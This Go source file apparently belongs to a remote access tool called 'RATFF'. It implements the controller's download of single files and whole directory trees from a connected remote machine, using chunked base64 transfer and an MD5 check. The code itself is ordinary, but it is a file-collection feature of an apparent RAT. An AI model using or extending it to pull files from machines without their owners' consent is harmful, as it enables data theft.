package client

import (
	"crypto/md5"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"os"
	"path/filepath"
	"time"

	"RATFF/shared"
)

// ProgressBarCreator creates a progress bar for file transfers.
type ProgressBarCreator func(total int64, filename string) ProgressBar

// ProgressBar interface for progress display.
type ProgressBar interface {
	Add(n int64)
	Display()
	MarkDone()
}

// DownloadFile downloads a file or directory from the remote client.
func (m *Manager) DownloadFile(id, remotePath, localPath string, newProgressBar ProgressBarCreator) {
	if m.isRemoteDirectory(id, remotePath) {
		m.downloadDirectory(id, remotePath, localPath, newProgressBar)
		return
	}

	m.downloadSingleFile(id, remotePath, localPath, newProgressBar)
}

func (m *Manager) isRemoteDirectory(id, remotePath string) bool {
	msg := m.WaitForResponseRaw(id, shared.CmdFileList, map[string]interface{}{"path": remotePath}, 10*time.Second)
	if msg == nil {
		return false
	}
	if msg.Payload == nil {
		return false
	}
	if _, hasError := msg.Payload["error"].(string); hasError {
		return false
	}
	_, hasFiles := msg.Payload["files"]
	return hasFiles
}

func (m *Manager) downloadSingleFile(id, remotePath, localPath string, newProgressBar ProgressBarCreator) {
	filename := filepath.Base(remotePath)

	if localPath == "" || localPath == "." {
		localPath = filename
	}

	localPath = filepath.Clean(localPath)

	dir := filepath.Dir(localPath)
	if dir != "." && dir != "/" {
		if err := os.MkdirAll(dir, 0755); err != nil {
			m.Print.Error(m.Tf("create_dir_failed", dir, err))
			return
		}
	}

	fileID := shared.GenerateID()

	m.Print.Info(m.Tf("download_starting", filename, remotePath))

	payload := map[string]interface{}{
		"file_id":    fileID,
		"local_path": remotePath,
	}

	msg := m.WaitForResponseWithMsg(id, shared.CmdFileDownloadStart, payload, 10*time.Second)
	if msg == nil {
		return
	}

	if msg.Payload == nil {
		m.Print.Error(m.T("download_start_failed"))
		return
	}

	if errMsg, ok := msg.Payload["error"].(string); ok {
		m.Print.Error(m.Tf("download_start_failed_detail", errMsg))
		return
	}

	fileSizeF, _ := msg.Payload["file_size"].(float64)
	fileSize := int64(fileSizeF)

	outFile, err := os.Create(localPath)
	if err != nil {
		m.Print.Error(m.Tf("file_create_failed", localPath, err))
		return
	}
	defer outFile.Close()

	totalChunksF, _ := msg.Payload["total_chunks"].(float64)
	totalChunks := int(totalChunksF)

	progressBar := newProgressBar(fileSize, filename)

	md5hash := md5.New()

	for i := 0; i < totalChunks; i++ {
		chunkPayload := map[string]interface{}{
			"file_id":     fileID,
			"chunk_index": i,
		}

		chunkMsg := m.WaitForResponseWithMsg(id, shared.CmdFileDownloadChunk, chunkPayload, chunkTimeout)
		if chunkMsg == nil {
			progressBar.MarkDone()
			progressBar.Display()
			m.Print.Error(m.Tf("download_chunk_failed", i))
			return
		}

		if chunkMsg.Payload == nil {
			progressBar.MarkDone()
			progressBar.Display()
			m.Print.Error(m.Tf("download_chunk_empty", i))
			return
		}

		if errMsg, ok := chunkMsg.Payload["error"].(string); ok {
			progressBar.MarkDone()
			progressBar.Display()
			m.Print.Error(m.Tf("download_chunk_failed_detail", i, errMsg))
			return
		}

		chunkDataB64, _ := chunkMsg.Payload["chunk_data"].(string)
		chunkData, err := base64.StdEncoding.DecodeString(chunkDataB64)
		if err != nil {
			progressBar.MarkDone()
			progressBar.Display()
			m.Print.Error(m.Tf("decode_chunk_failed", err))
			return
		}

		n, err := outFile.Write(chunkData)
		if err != nil {
			progressBar.MarkDone()
			progressBar.Display()
			m.Print.Error(m.Tf("write_chunk_failed", err))
			return
		}

		md5hash.Write(chunkData[:n])
		progressBar.Add(int64(n))
		progressBar.Display()
	}

	completePayload := map[string]interface{}{
		"file_id": fileID,
	}

	msg = m.WaitForResponseWithMsg(id, shared.CmdFileDownloadComplete, completePayload, 10*time.Second)
	if msg == nil {
		progressBar.MarkDone()
		progressBar.Display()
		m.Print.Error(m.T("download_complete_failed"))
		return
	}

	progressBar.MarkDone()
	progressBar.Display()

	if msg.Payload != nil {
		if remoteMD5, ok := msg.Payload["md5"].(string); ok {
			localMD5 := hex.EncodeToString(md5hash.Sum(nil))
			if remoteMD5 != localMD5 {
				m.Print.Warn(m.Tf("download_md5_mismatch", localMD5, remoteMD5))
			} else {
				m.Print.Success(m.Tf("download_success", remotePath, localPath))
			}
		} else {
			m.Print.Success(m.Tf("download_success", remotePath, localPath))
		}
	}
}

type remoteEntry struct {
	Name  string
	IsDir bool
}

func (m *Manager) listRemoteDir(id, path string) ([]remoteEntry, error) {
	msg := m.WaitForResponseRaw(id, shared.CmdFileList, map[string]interface{}{"path": path}, 10*time.Second)
	if msg == nil {
		return nil, fmt.Errorf("no response")
	}
	if msg.Payload == nil {
		return nil, fmt.Errorf("empty payload")
	}
	if errMsg, ok := msg.Payload["error"].(string); ok {
		return nil, fmt.Errorf("%s", errMsg)
	}

	filesInterface, ok := msg.Payload["files"].([]interface{})
	if !ok {
		return nil, fmt.Errorf("invalid files response")
	}

	var entries []remoteEntry
	for _, f := range filesInterface {
		fm, ok := f.(map[string]interface{})
		if !ok {
			continue
		}
		name, _ := fm["name"].(string)
		isDir, _ := fm["is_dir"].(bool)
		entries = append(entries, remoteEntry{Name: name, IsDir: isDir})
	}
	return entries, nil
}

func (m *Manager) downloadDirectory(id, remoteDir, localDir string, newProgressBar ProgressBarCreator) {
	dirName := filepath.Base(remoteDir)
	if localDir == "" || localDir == "." {
		localDir = dirName
	}

	if err := os.MkdirAll(localDir, 0755); err != nil {
		m.Print.Error(m.Tf("create_dir_failed", localDir, err))
		return
	}

	m.Print.Info(m.Tf("download_dir_starting", dirName, remoteDir))

	var allFiles []struct {
		RemotePath string
		LocalPath  string
	}

	err := m.walkRemoteDir(id, remoteDir, localDir, &allFiles)
	if err != nil {
		m.Print.Error(m.Tf("download_dir_walk_failed", remoteDir, err))
		return
	}

	if len(allFiles) == 0 {
		m.Print.Info(m.Tf("download_dir_empty", dirName))
		return
	}

	m.Print.Info(m.Tf("download_dir_file_count", len(allFiles)))

	successCount := 0
	for i, f := range allFiles {
		relPath, _ := filepath.Rel(localDir, f.LocalPath)
		m.Print.Info(m.Tf("download_dir_file", i+1, len(allFiles), relPath))

		m.downloadSingleFile(id, f.RemotePath, f.LocalPath, newProgressBar)
		successCount++
	}

	m.Print.Success(m.Tf("download_dir_success", dirName, localDir, successCount, len(allFiles)))
}

func (m *Manager) walkRemoteDir(id, remoteDir, localDir string, allFiles *[]struct {
	RemotePath string
	LocalPath  string
}) error {
	entries, err := m.listRemoteDir(id, remoteDir)
	if err != nil {
		return err
	}

	for _, entry := range entries {
		remotePath := filepath.Join(remoteDir, entry.Name)
		remotePath = filepath.ToSlash(remotePath)
		localPath := filepath.Join(localDir, entry.Name)

		if entry.IsDir {
			if err := os.MkdirAll(localPath, 0755); err != nil {
				m.Print.Warn(m.Tf("create_dir_failed", localPath, err))
				continue
			}
			if err := m.walkRemoteDir(id, remotePath, localPath, allFiles); err != nil {
				m.Print.Warn(m.Tf("download_dir_walk_failed", remotePath, err))
				continue
			}
		} else {
			*allFiles = append(*allFiles, struct {
				RemotePath string
				LocalPath  string
			}{remotePath, localPath})
		}
	}
	return nil
}
